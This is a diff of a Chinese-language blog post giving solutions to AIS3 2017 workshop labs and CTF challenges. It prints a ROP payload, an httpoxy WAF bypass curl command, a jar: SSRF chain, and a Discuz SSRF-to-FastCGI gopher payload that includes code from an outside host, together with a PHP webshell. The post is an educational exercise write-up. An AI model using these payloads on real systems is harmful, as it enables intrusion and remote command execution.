@@ -15,7 +15,7 @@
 <meta property="og:site_name" content="Kaibro&#39;s blog">
 <meta property="og:description" content="前言AIS3 workshop是AIS3上課的pwn跟SSRF練習平台。因為平台好像關惹，我也懶得重搞環境打一次所以下面解法很多都是憑著印象打出來的，有錯請見諒 lab1">
 <meta property="og:image" content="https://i.imgur.com/jEhADhe.png width:70%">
-<meta property="og:updated_time" content="2017-10-30T13:13:50.000Z">
+<meta property="og:updated_time" content="2017-10-30T16:22:58.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="AIS3 2017 Workshop">
 <meta name="twitter:description" content="前言AIS3 workshop是AIS3上課的pwn跟SSRF練習平台。因為平台好像關惹，我也懶得重搞環境打一次所以下面解法很多都是憑著印象打出來的，有錯請見諒 lab1">
@@ -249,16 +249,16 @@
 <p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;/bin/sh&quot;,&quot;\x00&quot;,&quot;\x0a\x01\x40\x00\x00\x00\x00\x00&quot;x38,&quot;\xed\x00\x40\x00\x00\x00\x00\x00&quot;,&quot;\xb0\xdd&quot;&apos;</div></pre></td></tr></table></figure></p>
 <p>FLAG大概長這樣：<code>AIS3{r0p_is_e4sy_4nd_fUn}</code></p>
 <p><br></p>
-<h2 id="Bonus_-_HTTProxy"><a href="#Bonus_-_HTTProxy" class="headerlink" title="Bonus - HTTProxy"></a>Bonus - HTTProxy</h2><p>這題就是orange上課講的Header會被代成環境變數(加上HTTP_的prefix)<br>然後HTTP_Proxy又會被許多http library當成Proxy用<br>所以只要在我的Web Server新增這樣一個檔案: x.x.x.x/waf/index.php<br>內容為&lt;?php echo ‘ok’; ?&gt;<br>接著<code>curl --header &#39;Proxy: x.x.x.x&#39; https://54.199.254.155/cgi-bin/?id=1</code><br>就能繞過waf惹，繞過之後直接對id做SQL injection就能拿到FLAG<br><code>hitcon{Did you know httpoxy.org?}</code></p>
+<h2 id="Bonus_-_HTTProxy"><a href="#Bonus_-_HTTProxy" class="headerlink" title="Bonus - HTTProxy"></a>Bonus - HTTProxy</h2><p>這題就是orange上課講的Header會被代成環境變數(加上HTTP_的prefix)<br>然後HTTP_Proxy又會被許多http library當成Proxy用<br>所以只要在我的Web Server新增這樣一個檔案: x.x.x.x/waf/index.php<br>內容為<code>&lt;?php echo &#39;ok&#39;; ?&gt;</code><br>接著<code>curl --header &#39;Proxy: x.x.x.x&#39; https://54.199.254.155/cgi-bin/?id=1</code><br>就能繞過waf惹，繞過之後直接對id做SQL injection就能拿到FLAG<br><code>hitcon{Did you know httpoxy.org?}</code></p>
 <p><br></p>
 <h2 id="Bonus_-_Jar"><a href="#Bonus_-_Jar" class="headerlink" title="Bonus - Jar"></a>Bonus - Jar</h2><p>這題有一個可以送出URL的地方<br>這裡可以SSRF，而且file://可以遍歷目錄<br>然後仔細觀察可以發現他有個<code>?page=orange</code>的參數<br>他會去load users/orange.tmp這個檔案</p>
 <p>這題就是要利用到jar協議的特性<br>塞給他一個jar:形式的網址，他會去抓這個檔案做暫存，但是抓完就會刪除暫存<br>所以就是要想辦法塞給他惡意檔案，然後讓他抓完之後不立刻結束連線<br>再想辦法去跑這個暫存檔<br>這裡我是用<a href="https://github.com/pwntester/BlockingServer" target="_blank" rel="external">https://github.com/pwntester/BlockingServer</a><br>在機器x.x.x.x上新建kaibro.php<br>跑Blocking Server: <code>java BlokingServer 12345 kaibro.php</code><br>URL的地方塞<code>jar:http://x.x.x.x:12345/kaibro.php!/</code>讓它卡住<br>再來用<code>file:///tmp/</code>去看暫存檔的名字，可能檔名叫jar_cache123456.tmp之類的<br>然後利用<code>?page=../../../../../../tmp/jar_cache123456</code>就可以跑我們的php囉</p>
 <p>FLAG長這樣：<code>hitcon{Life so hard :(}</code></p>
-<p>Discuz因為感覺會很難所以沒解，剩下其他題的話解法應該Google都找得到(?</p>
-<p>Update:<br>後來太無聊，跑去架了一樣的Discuz環境打打看<br>基本上，orange上課的投影片就已經是解法了XDD</p>
+<h2 id="Bonus_-_Discuz_Pwn"><a href="#Bonus_-_Discuz_Pwn" class="headerlink" title="Bonus - Discuz Pwn"></a>Bonus - Discuz Pwn</h2><p>Discuz因為感覺會很難所以沒解，剩下其他題的話解法應該Google都找得到(?</p>
+<p><br><br>Update:<br>後來太無聊，跑去架了一樣的Discuz環境打打看<br>基本上，orange上課的投影片就已經是解法了XDD</p>
 <p>因為_dfsockopen實作中，有FOLLOWLOCATION<br>所以可以利用SSRF 302跳轉的方式去偽造FastCGI協議</p>
 <p>在我自己的Server上，建立一個302.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header( <span class="string">"Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://kaibro.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00"</span> );</div></pre></td></tr></table></figure></p>
-<p>這一整串噁心的東西，主要就是在偽造FastCGI協議<br>然後讓他去include我Server上的php file</p>
+<p>這一整串噁心的東西，主要就是在偽造FastCGI協議<br>然後讓他去include我Server上的php script (<a href="http://kaibro.tw/x" target="_blank" rel="external">http://kaibro.tw/x</a>)</p>
 <p>Server上的x:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
 <p>然後訪問<code>http://thisdiscuzsite/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://kaibro.tw/302.php?.jpg[/img]</code><br>它就會成功include我們的x進來<br>也就可以執行webshell惹</p>
 <p><br></p>
